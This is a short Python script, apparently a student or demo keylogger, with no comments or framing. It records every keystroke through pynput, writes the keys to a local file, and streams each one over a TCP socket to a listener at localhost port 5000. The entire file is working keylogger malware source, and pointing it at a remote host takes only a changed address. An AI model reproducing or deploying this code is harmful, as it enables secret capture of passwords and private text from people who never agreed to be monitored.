
import socket
import os
from pynput import keyboard


pid = os.getpid()
host = "127.0.0.1" 
port = 5000
client_socket = socket.socket()  
client_socket.connect((host, port))



def on_press(key):
    f = open("output.txt","a+")
    
    try:
        f.write(format(key.char))
        u = format(key.char)
        client_socket.send(u.encode())
    
    except AttributeError:
        if key == key.space:
            f.write(" ")
            client_socket.send(" ".encode())
        
        else:
            if key == key.enter:
                f.write(chr(10))
                client_socket.send(chr(10).encode())




def client_program():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    listener.start()
     
  
      
    


client_program()
client_socket.close()
 